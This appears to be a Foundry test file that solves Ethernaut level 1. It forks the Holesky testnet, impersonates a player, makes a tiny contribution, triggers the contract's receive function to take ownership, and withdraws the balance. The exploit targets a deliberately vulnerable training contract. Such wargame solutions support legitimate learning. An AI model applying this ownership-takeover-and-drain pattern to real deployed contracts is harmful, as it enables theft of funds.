// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {Level01} from "../../src/Ethernaut/level01.sol";

contract ContractTest is Test {
    function setUp() public {}

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        vm.createSelectFork(vm.rpcUrl("holesky"));
        vm.startPrank(playerAddress);
        Level01 level01 = Level01(
            payable(0xaCA05FA253b904731E3e9536A6eA1d84DB3D7142)
        );
        level01.contribute{value: 1}();
        payable(level01).call{value: 1}("");
        level01.withdraw();
        vm.stopPrank();

        assertTrue(
            level01.owner() == playerAddress && address(level01).balance == 0
        );
    }
}
